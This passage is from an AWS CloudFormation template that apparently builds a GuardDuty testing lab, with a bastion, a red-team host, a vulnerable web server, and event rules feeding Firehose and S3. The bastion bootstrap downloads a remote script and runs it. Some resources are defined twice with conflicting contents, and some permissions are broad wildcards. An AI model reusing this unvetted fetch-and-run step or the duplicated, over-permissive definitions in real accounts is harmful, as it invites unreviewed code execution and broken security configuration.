              "Resource": "*",
              "Action": "es:*"
            }
          ]
        }
      }
     ]
    }
    },
    "LambdaIAMPolicy": {
      "Type": "AWS::IAM::Policy",
      "Properties": {
        "Roles": [
          {
            "Ref": "LambdaIAMRole"
          }
        ],
        "PolicyName": "lambda",
        "PolicyDocument": {
          "Statement": [
            {
              "Effect": "Allow",
              "Action": [
                "lambda:InvokeFunction"
              ],
              "Resource": [
                "*"
              ]
            },
            {
              "Effect": "Allow",
              "Action": [
                "s3:PutObject"
              ],
              "Resource": [
                {
                  "Fn::Join": [
                    "",
                    [
                      "arn:aws:s3:::",
                      {
                        "Ref": "S3BucketGuardDuty"
                      },
                      "/*"
                    ]
                  ]
                }
              ]
            },
            {
              "Effect": "Allow",
              "Action": [
                "logs:CreateLogGroup",
                "logs:CreateLogStream",
                "logs:DescribeLogGroups",
                "logs:DescribeLogStreams",
                "logs:PutLogEvents"
              ],
              "Resource": [
                  "arn:aws:logs:*:*:*"
              ]
            }
          ]
        }
      }
    },
  "LambdaIAMRole": {
      "Type": "AWS::IAM::Role",
      "Properties": {
        "AssumeRolePolicyDocument": {
          "Statement": [
            {
              "Effect": "Allow",
              "Principal": {
                "Service": [
                  "lambda.amazonaws.com"
                ]
              },
              "Action": [
                "sts:AssumeRole"
              ]
            }
          ]
        },
        "Policies": [ {
          "PolicyName": "AllowKinesis",
          "PolicyDocument": { 
            "Version" : "2012-10-17",
            "Statement": [ {  
              "Effect": "Allow",
              "Resource": "*",
              "Action": [
                "kinesis:GetRecords",
                "kinesis:GetShardIterator",
                "kinesis:DescribeStream",
                "kinesis:ListStreams"
              ]
            }
          ]
        }
      }
     ]
    }
    },
    "CloudWatchEventRuleGuardduty": {
      "Type": "AWS::Events::Rule",
      "Properties": {
        "Description": "Events Rule with KinesisParameters",
        "EventPattern": {
          "source": [
            "aws.guardduty"
          ],
          "detail-type": [
            "GuardDuty Finding"
          ]
        },
        "RoleArn": {
          "Fn::GetAtt": [
            "CloudWatchEventInvokeKinesisTargetRole",
            "Arn"
          ]
        },
        "State": "ENABLED",
        "Targets": [
          {
            "Id": "GuardDuty-Firehose",
            "Arn": {
              "Fn::GetAtt": [
                "FirehoseDeliveryStreamGuardDuty",
                "Arn"
              ]
            },
            "RoleArn": {
              "Fn::GetAtt": [
                "CloudWatchEventInvokeKinesisTargetRole",
                "Arn"
              ]
            }
          }
        ]
      }
    },
    "CloudWatchEventRuleCloudTrail": {
      "Type": "AWS::Events::Rule",
      "Properties": {
        "Description": "Events Rule with KinesisParameters",
        "EventPattern": {
          "source": [
            "aws.cloudtrail"
          ],
          "detail-type": [
            "AWS API Call via CloudTrail"
          ],
          "detail": {
            "eventSource": [
              "cloudtrail.amazonaws.com"
            ]
          }
        },
        "RoleArn": {
          "Fn::GetAtt": [
            "CloudWatchEventInvokeKinesisTargetRole",
            "Arn"
          ]
        },
        "State": "ENABLED",
        "Targets": [
          {
            "Id": "CloudTrail-Firehose",
            "Arn": {
              "Fn::GetAtt": [
                "FirehoseDeliveryStreamCloudTrail",
                "Arn"
              ]
            },
            "RoleArn": {
              "Fn::GetAtt": [
                "CloudWatchEventInvokeKinesisTargetRole",
                "Arn"
              ]
            }
          }
        ]
      }
    },
    "CloudWatchEventRuleIAM": {
      "Type": "AWS::Events::Rule",
      "Properties": {
        "Description": "Events Rule with KinesisParameters",
        "EventPattern": {
          "source": [
            "aws.iam"
          ]
        },
        "RoleArn": {
          "Fn::GetAtt": [
            "CloudWatchEventInvokeKinesisTargetRole",
            "Arn"
          ]
        },
        "State": "ENABLED",
        "Targets": [
          {
            "Id": "Id123",
            "Arn": {
              "Fn::GetAtt": [
                "FirehoseDeliveryStreamIAM",
                "Arn"
              ]
            },
            "RoleArn": {
              "Fn::GetAtt": [
                "CloudWatchEventInvokeKinesisTargetRole",
                "Arn"
              ]
            }
          }
        ]
      }
    },
    "CloudWatchEventRuleMacie": {
      "Type": "AWS::Events::Rule",
      "Properties": {
        "Description": "Events Rule with KinesisParameters",
        "EventPattern": {
          "source": [
            "aws.macie"
          ]
        },
        "RoleArn": {
          "Fn::GetAtt": [
            "CloudWatchEventInvokeKinesisTargetRole",
            "Arn"
          ]
        },
        "State": "ENABLED",
        "Targets": [
          {
            "Id": "Id123",
            "Arn": {
              "Fn::GetAtt": [
                "FirehoseDeliveryStreamMacie",
                "Arn"
              ]
            },
            "RoleArn": {
              "Fn::GetAtt": [
                "CloudWatchEventInvokeKinesisTargetRole",
                "Arn"
              ]
            }
          }
        ]
      }
    },
    "CloudWatchEventRuleInspector": {
      "Type": "AWS::Events::Rule",
      "Properties": {
        "Description": "Events Rule with KinesisParameters",
        "EventPattern": {
          "source": [
            "aws.inspector"
          ]
        },
        "RoleArn": {
          "Fn::GetAtt": [
            "CloudWatchEventInvokeKinesisTargetRole",
            "Arn"
          ]
        },
        "State": "ENABLED",
        "Targets": [
          {
            "Id": "Id123",
            "Arn": {
              "Fn::GetAtt": [
                "FirehoseDeliveryStreamInspector",
                "Arn"
              ]
            },
            "RoleArn": {
              "Fn::GetAtt": [
                "CloudWatchEventInvokeKinesisTargetRole",
                "Arn"
              ]
            }
          }
        ]
      }
    },
    "CloudWatchEventInvokeKinesisTargetPolicyGuardDuty": {
      "Type": "AWS::IAM::Policy",
      "Properties": {
        "PolicyName": "firehose_delivery_policy_EventsInvoke-guardduty",
        "PolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [
            {
              "Effect": "Allow",
              "Action": [
                "firehose:PutRecord",
                "firehose:PutRecordBatch"
              ],
              "Resource": {
                "Fn::GetAtt": [
                  "FirehoseDeliveryStreamGuardDuty",
                  "Arn"
                ]
              }
            }
          ]
        },
        "Roles": [
          {
            "Ref": "CloudWatchEventInvokeKinesisTargetRole"
          }
        ]
      }
    },
    "CloudWatchEventInvokeKinesisTargetPolicyClouldTrail": {
      "Type": "AWS::IAM::Policy",
      "Properties": {
        "PolicyName": "firehose_delivery_policy_EventsInvoke-cloudtrail",
        "PolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [
            {
              "Effect": "Allow",
              "Action": [
                "firehose:PutRecord",
                "firehose:PutRecordBatch"
              ],
              "Resource": {
                "Fn::GetAtt": [
                  "FirehoseDeliveryStreamCloudTrail",
                  "Arn"
                ]
              }
            }
          ]
        },
        "Roles": [
          {
            "Ref": "CloudWatchEventInvokeKinesisTargetRole"
          }
        ]
      }
    },
    "CloudWatchEventInvokeKinesisTargetPolicyMacie": {
      "Type": "AWS::IAM::Policy",
      "Properties": {
        "PolicyName": "firehose_delivery_policy_EventsInvoke-macie",
        "PolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [
            {
              "Effect": "Allow",
              "Action": [
                "firehose:PutRecord",
                "firehose:PutRecordBatch"
              ],
              "Resource": {
                "Fn::GetAtt": [
                  "FirehoseDeliveryStreamMacie",
                  "Arn"
                ]
              }
            }
          ]
        },
        "Roles": [
          {
            "Ref": "CloudWatchEventInvokeKinesisTargetRole"
          }
        ]
      }
    },
    "CloudWatchEventInvokeKinesisTargetPolicyInspector": {
      "Type": "AWS::IAM::Policy",
      "Properties": {
        "PolicyName": "firehose_delivery_policy_EventsInvoke-inspector",
        "PolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [
            {
              "Effect": "Allow",
              "Action": [
                "firehose:PutRecord",
                "firehose:PutRecordBatch"
              ],
              "Resource": {
                "Fn::GetAtt": [
                  "FirehoseDeliveryStreamInspector",
                  "Arn"
                ]
              }
            }
          ]
        },
        "Roles": [
          {
            "Ref": "CloudWatchEventInvokeKinesisTargetRole"
          }
        ]
      }
    },
    "CloudWatchEventInvokeKinesisTargetPolicyIAM": {
      "Type": "AWS::IAM::Policy",
      "Properties": {
        "PolicyName": "firehose_delivery_policy_EventsInvoke-iam",
        "PolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [
            {
              "Effect": "Allow",
              "Action": [
                "firehose:PutRecord",
                "firehose:PutRecordBatch"
              ],
              "Resource": {
                "Fn::GetAtt": [
                  "FirehoseDeliveryStreamIAM",
                  "Arn"
                ]
              }
            }
          ]
        },
        "Roles": [
          {
            "Ref": "CloudWatchEventInvokeKinesisTargetRole"
          }
        ]
      }
    },
    "BastionInstanceProfile": {
      "Type": "AWS::IAM::InstanceProfile",
      "Properties": {
        "Roles": [
          {
            "Ref": "BastionIAMRole"
          }
        ],
        "Path": "/"
      }
    },
    "BastionAutoScalingGroup": {
      "Type": "AWS::AutoScaling::AutoScalingGroup",
      "Properties": {
        "LaunchConfigurationName": {
          "Ref": "BastionLaunchConfiguration"
        },
        "VPCZoneIdentifier": [
          {
            "Ref": "PublicSubnet"
          }
        ],
        "MinSize": "1",
        "MaxSize": "2",
        "Cooldown": "300",
        "DesiredCapacity": "1",
        "Tags": [
          {
            "Key": "Name",
            "Value": "LinuxBastion",
            "PropagateAtLaunch": true
          }
        ]
      },
      "CreationPolicy": {
        "ResourceSignal": {
          "Count": "1",
          "Timeout": "PT30M"
        }
      }
    },
    "BastionLaunchConfiguration": {
      "Type": "AWS::AutoScaling::LaunchConfiguration",
      "Metadata": {
        "AWS::CloudFormation::Init": {
          "config": {
            "b-bootstrap": {
              "command": {
                "Fn::Join": [
                  "",
                  [
                    "/tmp/bastion_bootstrap.sh",
                    " --banner ",
                    "https://raw.githubusercontent.com/awslabs/amazon-guardduty-tester/master/artifacts/banner_message.txt",
                    " --enable true",
                    " --tcp-forwarding true",
                    " --x11-forwarding false"
                  ]
                ]
              }
            }
          }
        }
      },
      "Properties": {
        "KeyName": {
          "Ref": "KeyPairName"
        },
        "ImageId": {
          "Fn::FindInMap": [
            "AWSAMIRegionMap",
            {
              "Ref": "AWS::Region"
            },
            {
              "Fn::FindInMap": [
                "AMINameMap",
                "Amazon-Linux-HVM",
                "Code"
              ]
            }
          ]
        },
        "SecurityGroups": [
          {
            "Ref": "BastionSecurityGroup"
          }
        ],
        "InstanceType": "t2.small",
        "UserData": {
          "Fn::Base64": {
            "Fn::Join": [
              "",
              [
                "#!/bin/bash\n",
                "export PATH=$PATH:/usr/local/bin\n",
                "yum update -y\n",
                "yum install nmap -y\n",
                "easy_install https://s3.amazonaws.com/cloudformation-examples/aws-cfn-bootstrap-latest.tar.gz\n",
                "curl -L -o /tmp/bastion_bootstrap.sh https://github.com/awslabs/amazon-guardduty-tester/raw/master/bastion_bootstrap.sh\n",
                "chown root: /tmp/bastion_bootstrap.sh\n",
                "chmod +x /tmp/bastion_bootstrap.sh\n",
                "EIP_LIST=\"",
                {
                  "Ref": "EIP"
                },
                ",Null,Null,Null",
                "\"\n",
                "CLOUDWATCHGROUP=",
                {
                  "Ref": "BastionLogGroup"
                },
                "\n",
                "/tmp/bastion_bootstrap.sh",
                " --banner ",
                "https://raw.githubusercontent.com/awslabs/amazon-guardduty-tester/master/artifacts/banner_message.txt",
                " --enable true",
                " --tcp-forwarding true",
                " --x11-forwarding false",
                "\n",
                "/opt/aws/bin/cfn-signal -e $? --stack ",
                {
                  "Ref": "AWS::StackName"
                },
                " --resource BastionAutoScalingGroup --region ",
                {
                  "Ref": "AWS::Region"
                },
                "\n"
              ]
            ]
          }
        },
        "IamInstanceProfile": {
          "Ref": "BastionInstanceProfile"
        }
      }
    },
    "BastionSecurityGroup": {
      "Type": "AWS::EC2::SecurityGroup",
      "Properties": {
        "GroupDescription": "Enables SSH Access to Bastion Hosts",
        "VpcId": {
          "Ref": "VPC"
        },
        "SecurityGroupIngress": [
          {
            "IpProtocol": "tcp",
            "FromPort": "22",
            "ToPort": "22",
            "CidrIp": {
              "Ref": "RemoteAccessCIDR"
            }
          }
        ]
      }
    },
    "RedTeamSecurityGroup": {
      "Type": "AWS::EC2::SecurityGroup",
      "Properties": {
        "GroupDescription": "Enables SSH Access to RedTeam Tools Host",
        "VpcId": {
          "Ref": "VPC"
        },
        "SecurityGroupIngress": [
          {
            "IpProtocol": "tcp",
            "FromPort": "22",
            "ToPort": "22",
            "SourceSecurityGroupId": {
              "Ref": "BastionSecurityGroup"
            }
          },
          {
            "IpProtocol": "tcp",
            "FromPort": "53",
            "ToPort": "53",
            "CidrIp": {
              "Ref": "PrivateSubnetCIDR"
            }
          },
          {
            "IpProtocol": "udp",
            "FromPort": "53",
            "ToPort": "53",
            "CidrIp": {
              "Ref": "PrivateSubnetCIDR"
            }
          },
          {
            "IpProtocol": "tcp",
            "FromPort": "5050",
            "ToPort": "5050",
            "CidrIp": {
              "Ref": "PrivateSubnetCIDR"
            }
          },
          {
            "IpProtocol": "icmp",
            "FromPort": "-1",
            "ToPort": "-1",
            "SourceSecurityGroupId": {
              "Ref": "BastionSecurityGroup"
            }
          }
        ]
      }
    },
    "FirehoseDeliveryStreamGuardDuty": {
      "Type": "AWS::KinesisFirehose::DeliveryStream",
      "Properties": {
        "ExtendedS3DestinationConfiguration": {
          "BucketARN": {
            "Fn::Join": [
              "",
              [
                "arn:aws:s3:::",
                {
                  "Ref": "S3BucketGuardDuty"
                }
              ]
            ]
          },
          "BufferingHints": {
            "IntervalInSeconds": 300,
            "SizeInMBs": "5"
          },
          "CompressionFormat": "UNCOMPRESSED",
          "Prefix": "firehose/",
          "RoleARN": {
            "Fn::GetAtt": [
              "FirehoseDeliveryRoleALL",
              "Arn"
            ]
          },
          "ProcessingConfiguration": {
            "Enabled": false
          }
        }
      }
    },
    "FirehoseDeliveryStreamCloudTrail": {
      "Type": "AWS::KinesisFirehose::DeliveryStream",
      "Properties": {
        "ElasticsearchDestinationConfiguration": {
          "TypeName": "log",
          "CloudWatchLoggingOptions": {
            "Enabled": true,
            "LogGroupName": "deliverystream",
            "LogStreamName": "elasticsearchDelivery"
          },
          "BufferingHints": {
            "IntervalInSeconds": 60,
            "SizeInMBs": 50
          },
          "DomainARN": "arn:aws:es:us-east-1:176188753941:domain/guard-duty-findings",
          "IndexName": { "Ref" : "IndexName" },
          "IndexRotationPeriod": "OneHour",
          "RetryOptions": {
            "DurationInSeconds": "60"
          },
          "RoleARN": {
            "Fn::GetAtt": [
              "FirehoseDeliveryRoleALL",
              "Arn"
            ]
          },
          "S3BackupMode": "AllDocuments",
          "S3Configuration": {
            "BucketARN": { "Fn::GetAtt" : ["S3BucketCloudTrail", "Arn"] },
            "BufferingHints": {
              "IntervalInSeconds": "60",
              "SizeInMBs": "50"
            },
            "CompressionFormat": "UNCOMPRESSED",
            "Prefix": {
              "Fn::Join": [
              "",
              [
                "AWS::Region",
                "/"
              ]
            ]
            },
            "RoleARN": {
              "Fn::GetAtt": [
                "FirehoseDeliveryRoleALL",
                "Arn"
              ]
            },
            "CloudWatchLoggingOptions": {
              "Enabled": true,
              "LogGroupName": "deliverystream",
              "LogStreamName": "s3Backup"
            }
          }
        }
      }
    },
    "FirehoseDeliveryStreamIAM": {
      "Type": "AWS::KinesisFirehose::DeliveryStream",
      "Properties": {
        "ExtendedS3DestinationConfiguration": {
          "BucketARN": {
            "Fn::Join": [
              "",
              [
                "arn:aws:s3:::",
                {
                  "Ref": "S3BucketIAM"
                }
              ]
            ]
          },
          "BufferingHints": {
            "IntervalInSeconds": "300",
            "SizeInMBs": "5"
          },
          "CompressionFormat": "UNCOMPRESSED",
          "Prefix": "firehose/",
          "RoleARN": {
            "Fn::GetAtt": [
              "FirehoseDeliveryRoleALL",
              "Arn"
            ]
          },
          "ProcessingConfiguration": {
            "Enabled": false
          }
        }
      }
    },
    "FirehoseDeliveryStreamInspector": {
      "Type": "AWS::KinesisFirehose::DeliveryStream",
      "Properties": {
        "ExtendedS3DestinationConfiguration": {
          "BucketARN": {
            "Fn::Join": [
              "",
              [
                "arn:aws:s3:::",
                {
                  "Ref": "S3BucketInspector"
                }
              ]
            ]
          },
          "BufferingHints": {
            "IntervalInSeconds": "300",
            "SizeInMBs": "5"
          },
          "CompressionFormat": "UNCOMPRESSED",
          "Prefix": "firehose/",
          "RoleARN": {
            "Fn::GetAtt": [
              "FirehoseDeliveryRoleALL",
              "Arn"
            ]
          },
          "ProcessingConfiguration": {
            "Enabled": false
          }
        }
      }
    },
    "FirehoseDeliveryStreamMacie": {
      "Type": "AWS::KinesisFirehose::DeliveryStream",
      "Properties": {
        "ExtendedS3DestinationConfiguration": {
          "BucketARN": {
            "Fn::Join": [
              "",
              [
                "arn:aws:s3:::",
                {
                  "Ref": "S3BucketMacie"
                }
              ]
            ]
          },
          "BufferingHints": {
            "IntervalInSeconds": "300",
            "SizeInMBs": "5"
          },
          "CompressionFormat": "UNCOMPRESSED",
          "Prefix": "firehose/",
          "RoleARN": {
            "Fn::GetAtt": [
              "FirehoseDeliveryRoleALL",
              "Arn"
            ]
          },
          "ProcessingConfiguration": {
            "Enabled": false
          }
        }
      }
    },
    "RedTeamInstanceProfile": {
      "Type": "AWS::IAM::InstanceProfile",
      "Properties": {
        "Roles": [
          {
            "Ref": "RedTeamIAMRole"
          }
        ],
        "Path": "/"
      }
    },
    "VulnWebServerInstanceProfile": {
      "Type": "AWS::IAM::InstanceProfile",
      "Properties": {
        "Roles": [
          {
            "Ref": "VulnWebServerIAMRole"
          }
        ],
        "Path": "/"
      }
    },
    "BasicLinuxSecurityGroup": {
      "Type": "AWS::EC2::SecurityGroup",
      "Properties": {
        "GroupDescription": "Enables Admin Access to basic linux hosts",
        "VpcId": {
          "Ref": "VPC"
        },
        "SecurityGroupIngress": [
          {
            "IpProtocol": "tcp",
            "FromPort": "22",
            "ToPort": "22",
            "SourceSecurityGroupId": {
              "Ref": "RedTeamSecurityGroup"
            }
          },
          {
            "IpProtocol": "tcp",
            "FromPort": "80",
            "ToPort": "80",
            "SourceSecurityGroupId": {
              "Ref": "RedTeamSecurityGroup"
            }
          },
          {
            "IpProtocol": "tcp",
            "FromPort": "5050",
            "ToPort": "5050",
            "SourceSecurityGroupId": {
              "Ref": "RedTeamSecurityGroup"
            }
          },
          {
            "IpProtocol": "icmp",
            "FromPort": "-1",
            "ToPort": "-1",
            "SourceSecurityGroupId": {
              "Ref": "RedTeamSecurityGroup"
            }
          }
        ]
      }
    },
    "BasicLinuxIAMRole": {
      "Type": "AWS::IAM::Role",
      "Properties": {
        "AssumeRolePolicyDocument": {
          "Statement": [
            {
              "Effect": "Allow",
              "Principal": {
                "Service": [
                  "ec2.amazonaws.com"
                ]
              },
              "Action": [
                "sts:AssumeRole"
              ]
            }
          ]
        },
        "Path": "/",
        "ManagedPolicyArns": [
          "arn:aws:iam::aws:policy/AmazonEC2ReadOnlyAccess"
        ]
      }
    },
    "BasicLinuxInstanceProfile": {
      "Type": "AWS::IAM::InstanceProfile",
      "Properties": {
        "Roles": [
          {
            "Ref": "BasicLinuxIAMRole"
          }
        ],
        "Path": "/"
      }
    },
    "BasicWindowsInstanceProfile": {
      "Type": "AWS::IAM::InstanceProfile",
      "Properties": {
        "Roles": [
          {
            "Ref": "BasicWindowsIAMRole"
          }
        ],
        "Path": "/"
      }
    },
    "BastionLogGroup": {
      "Type": "AWS::Logs::LogGroup"
    },
    "RedTeamNetworkInterface": {
      "Type": "AWS::EC2::NetworkInterface",
      "Properties": {
        "SubnetId": {
          "Ref": "PrivateSubnet"
        },
        "GroupSet": [
          {
            "Ref": "RedTeamSecurityGroup"
          }
        ]
      }
    },
    "VulnWebServerNetworkInterface": {
      "Type": "AWS::EC2::NetworkInterface",
      "Properties": {
        "SubnetId": {
          "Ref": "PrivateSubnet"
        },
        "GroupSet": [
          {
            "Ref": "VulnWebServerSecurityGroup"
          }
        ]
      }
    },
    "BasicLinuxNetworkInterface": {
      "Type": "AWS::EC2::NetworkInterface",
      "Properties": {
        "SubnetId": {
          "Ref": "PrivateSubnet"
        },
        "GroupSet": [
          {
            "Ref": "BasicLinuxSecurityGroup"
          }
        ]
      }
    },
    "BasicWindowsSecurityGroup": {
      "Type": "AWS::EC2::SecurityGroup",
      "Properties": {
        "GroupDescription": "Enables Admin Access to basic windows hosts",
        "VpcId": {
          "Ref": "VPC"
        },
        "SecurityGroupIngress": [
          {
            "IpProtocol": "tcp",
            "FromPort": "3389",
            "ToPort": "3389",
            "SourceSecurityGroupId": {
              "Ref": "RedTeamSecurityGroup"
            }
          },
          {
            "IpProtocol": "icmp",
            "FromPort": "-1",
            "ToPort": "-1",
            "SourceSecurityGroupId": {
              "Ref": "RedTeamSecurityGroup"
            }
          }
        ]
      }
    },
    "BasicWindowsIAMRole": {
      "Type": "AWS::IAM::Role",
      "Properties": {
        "AssumeRolePolicyDocument": {
          "Statement": [
            {
              "Effect": "Allow",
              "Principal": {
                "Service": [
                  "ec2.amazonaws.com"
                ]
              },
              "Action": [
                "sts:AssumeRole"
              ]
            }
          ]
        },
        "Path": "/"
      }
    },
    "BastionIAMRole": {
      "Type": "AWS::IAM::Role",
      "Properties": {
        "Policies": [
          {
            "PolicyDocument": {
              "Version": "2012-10-17",
              "Statement": [
                {
                  "Action": [
                    "logs:CreateLogStream",
                    "logs:GetLogEvents",
                    "logs:PutLogEvents",
                    "logs:DescribeLogGroups",
                    "logs:DescribeLogStreams",
                    "logs:PutRetentionPolicy",
                    "logs:PutMetricFilter",
                    "logs:CreateLogGroup"
                  ],
                  "Resource": {
                    "Fn::Sub": [
                      "arn:${Partition}:logs:${AWS::Region}:${AWS::AccountId}:log-group:${BastionLogGroup}:*",
                      {
                        "Partition": {
                          "Fn::If": [
                            "GovCloudCondition",
                            "aws-us-gov",
                            "aws"
                          ]
                        }
                      }
                    ]
                  },
                  "Effect": "Allow"
                }
              ]
            },
            "PolicyName": "bastion-cloudwatch-logs-policy"
          },
          {
            "PolicyDocument": {
              "Version": "2012-10-17",
              "Statement": [
                {
                  "Action": [
                    "ec2:AssociateAddress",
                    "ec2:DescribeAddresses"
                  ],
                  "Resource": [
                    "*"
                  ],
                  "Effect": "Allow"
                }
              ]
            },
            "PolicyName": "bastion-eip-policy"
          }
        ],
        "Path": "/",
        "AssumeRolePolicyDocument": {
          "Statement": [
            {
              "Action": [
                "sts:AssumeRole"
              ],
              "Principal": {
                "Service": [
                  "ec2.amazonaws.com"
                ]
              },
              "Effect": "Allow"
            }
          ],
          "Version": "2012-10-17"
        }
      }
    },
    "CloudWatchToKinesisIAMRole": {
      "Type": "AWS::IAM::Role",
      "Properties": {
        "AssumeRolePolicyDocument": {
          "Statement": [
            {
              "Effect": "Allow",
              "Principal": {
                "Service": {
                  "Fn::Join": [
                    "",
                    [
                      "logs.",
                      {
                        "Ref": "AWS::Region"
                      },
                      ".amazonaws.com"
                    ]
                  ]
                }
              },
              "Action": "sts:AssumeRole"
            }
          ]
        }
      }
    },
    "CloudWatchToKinesisIAMPolicy": {
      "Type": "AWS::IAM::Policy",
      "Properties": {
        "PolicyName": "kinesis",
        "Roles": [
          {
            "Ref": "CloudWatchToKinesisIAMRole"
          }
        ],
        "PolicyDocument": {
          "Statement": [
            {
              "Effect": "Allow",
              "Action": [
                "kinesis:PutRecord"
              ],
              "Resource": [
                {
                  "Fn::GetAtt": [
                    "VPCFlowLogStream",
                    "Arn"
                  ]
                }
              ]
            },
            {
              "Effect": "Allow",
              "Action": "iam:PassRole",
              "Resource": [
                {
                  "Fn::GetAtt": [
                    "CloudWatchToKinesisIAMRole",
                    "Arn"
                  ]
                }
              ]
            }
          ]
        }
      }
    },
    "LambdaIAMPolicy": {
      "Type": "AWS::IAM::Policy",
      "Properties": {
        "Roles": [
          {
            "Ref": "LambdaIAMRole"
          }
        ],
        "PolicyName": "lambda",
        "PolicyDocument": {
          "Statement": [
            {
              "Effect": "Allow",
              "Action": [
                "lambda:InvokeFunction"
              ],
              "Resource": [
                "*"
              ]
            },
            {
              "Effect": "Allow",
              "Action": [
                "s3:PutObject"
              ],
              "Resource": [
                {
                  "Fn::Join": [
                    "",
                    [
                      "arn:aws:s3:::",
                      {
                        "Ref": "S3BucketVPCflow"
                      },
                      "/flowlogs/*"
                    ]
                  ]
                }
              ]
            },
            {
              "Effect": "Allow",
              "Action": [
                "logs:CreateLogGroup",
                "logs:CreateLogStream",
                "logs:PutLogEvents"
              ],
              "Resource": [
                "*"
              ]
            },
            {
              "Effect": "Allow",
              "Action": [
                "kinesis:GetRecords",
                "kinesis:GetShardIterator",
                "kinesis:DescribeStream",
                "kinesis:ListStreams"
              ],
              "Resource": [
                {
                  "Fn::GetAtt": [
                    "VPCFlowLogStream",
                    "Arn"
                  ]
                }
              ]
            }
          ]
        }
      }
    },
    "LambdaIAMRole": {
      "Type": "AWS::IAM::Role",
      "Properties": {
        "AssumeRolePolicyDocument": {
          "Statement": [
            {
              "Effect": "Allow",
              "Principal": {
                "Service": [
                  "lambda.amazonaws.com"
                ]
              },
              "Action": [
                "sts:AssumeRole"
              ]
            }
          ]
        },
        "Policies": [ {
          "PolicyName": "AllowKinesis",
          "PolicyDocument": { 
            "Version" : "2012-10-17",
            "Statement": [ {  
              "Effect": "Allow",
              "Resource": "*",
              "Action": [
                "kinesis:GetRecords",
                "kinesis:GetShardIterator",
                "kinesis:DescribeStream",
                "kinesis:ListStreams"
              ]
            }
          ]
        }
      }
     ]
    }
    },
    "PrivateSubnetRoute": {
      "Type": "AWS::EC2::Route",
      "Properties": {
        "RouteTableId": {
          "Ref": "PrivateSubnetRouteTable"
        },
        "DestinationCidrBlock": "0.0.0.0/0",
        "InstanceId": {
          "Fn::If": [
            "NATInstanceCondition",
            {
              "Ref": "NATInstance"
            },
            {
              "Ref": "AWS::NoValue"
            }
          ]
        },
        "NatGatewayId": {
          "Fn::If": [
            "NATGatewayCondition",
            {
              "Ref": "NATGateway"
            },
            {
              "Ref": "AWS::NoValue"
            }
          ]
        }
      }
    },
    "PublicSubnetRouteTable": {
      "Type": "AWS::EC2::RouteTable",
      "Properties": {
        "VpcId": {
          "Ref": "VPC"
        },
        "Tags": [
          {
            "Key": "Name",
            "Value": "Public Subnets"
          },
          {
            "Key": "Network",
            "Value": "Public"
          }
        ]
      }
    },
    "PublicSubnetRoute": {
      "DependsOn": "VPCGatewayAttachment",
      "Type": "AWS::EC2::Route",
      "Properties": {
        "RouteTableId": {
          "Ref": "PublicSubnetRouteTable"
        },
        "DestinationCidrBlock": "0.0.0.0/0",
        "GatewayId": {
          "Ref": "InternetGateway"
        }
      }
    },
    "NATInstanceSecurityGroup": {
      "Condition": "NATInstanceCondition",
      "Type": "AWS::EC2::SecurityGroup",
      "Properties": {
        "GroupDescription": "Enables outbound internet access for the VPC via the NAT instances",
        "VpcId": {
          "Ref": "VPC"
        },
        "SecurityGroupIngress": [
          {
            "IpProtocol": "-1",
            "FromPort": "1",
            "ToPort": "65535",
            "CidrIp": {
              "Ref": "VPCCIDR"
            }
          }
        ]
      }
    },
    "PrivateSubnetRouteTableAssociation": {
      "Type": "AWS::EC2::SubnetRouteTableAssociation",
      "Properties": {
        "SubnetId": {
          "Ref": "PrivateSubnet"
        },
        "RouteTableId": {
          "Ref": "PrivateSubnetRouteTable"
        }
      }
    },
    "PublicSubnetRouteTableAssociation": {
      "Type": "AWS::EC2::SubnetRouteTableAssociation",
      "Properties": {
        "SubnetId": {
          "Ref": "PublicSubnet"
        },
        "RouteTableId": {
          "Ref": "PublicSubnetRouteTable"
        }
      }
    },
    "PrivateSubnetRouteTable": {
      "Type": "AWS::EC2::RouteTable",
      "Properties": {
        "VpcId": {
          "Ref": "VPC"
        },
        "Tags": [
          {
            "Key": "Name",
            "Value": "Private subnet"
          },
          {
            "Key": "Network",
            "Value": "Private"
          }
        ]
      }
    },
    "EventSourceMappingLambdaKinesisToLambda": {
      "Type": "AWS::Lambda::EventSourceMapping",
      "Properties": {
        "BatchSize": {
          "Fn::FindInMap": [
            "Defaults",
            "EventSourceMapping",
            "BatchSize"
          ]
        },
        "Enabled": true,
        "EventSourceArn": {
          "Fn::GetAtt": [
            "VPCFlowLogStream",
            "Arn"
          ]
        },
        "FunctionName": {
          "Ref": "VPCLambdaFlowLogUpload"
        },
        "StartingPosition": "TRIM_HORIZON"
      }
    },
    "VPCFlowLogCreate": {
      "Type": "AWS::EC2::FlowLog",
      "Properties": {
        "DeliverLogsPermissionArn": {
          "Fn::GetAtt": [
            "FlowLogsToCloudWatchIAMRole",
            "Arn"
          ]
        },
        "LogGroupName": {
          "Ref": "CloudWatchLogGroupFlowLogs"
        },
        "ResourceId": {
          "Ref": "VPC"
        },
        "ResourceType": "VPC",
        "TrafficType": "ALL"
      }
    },
    "VPCFlowLogFilter": {
      "Type": "AWS::Logs::SubscriptionFilter",
      "Properties": {
        "DestinationArn": {
          "Fn::GetAtt": [
            "VPCFlowLogStream",
            "Arn"
          ]
        },
        "FilterPattern": {
          "Fn::Join": [
            "",
            [
              "[version, account_id, ",
              "interface_id, srcaddr, dstaddr, srcport, dstport, protocol, ",
              "packets, bytes, start, end, action, log_status]"
            ]
          ]
        },
        "LogGroupName": {
          "Ref": "CloudWatchLogGroupFlowLogs"
        },
        "RoleArn": {
          "Fn::GetAtt": [
            "CloudWatchToKinesisIAMRole",
            "Arn"
          ]
        }
      }
    },
    "VPCLambdaFlowLogUpload": {
      "Type": "AWS::Lambda::Function",
      "Properties": {
        "Handler": "index.handler",
        "MemorySize": 256,
        "Role": {
          "Fn::GetAtt": [
            "LambdaIAMRole",
            "Arn"
          ]
        },
        "Runtime": "nodejs6.10",
        "Timeout": 60,
        "Code": {
          "ZipFile": {
            "Fn::Join": [
              "",
              [
                "console.log('Loading function');\n",
                "\n",
                "var bucket = '",
                {
                  "Ref": "S3BucketVPCflow"
                },
                "';\n",
                "var path = 'flowlogs';\n",
                "var zlib = require('zlib');\n",
                "var AWS = require('aws-sdk');\n",
                "AWS.config.update({region: '",
                {
                  "Ref": "AWS::Region"
                },
                "'});\n",
                "var s3 = new AWS.S3();\n",
                "\n",
                "exports.handler = function(event, context) {\n",
                "    var i = 0;\n",
                "    var record;\n",
                "    var data = [];\n",
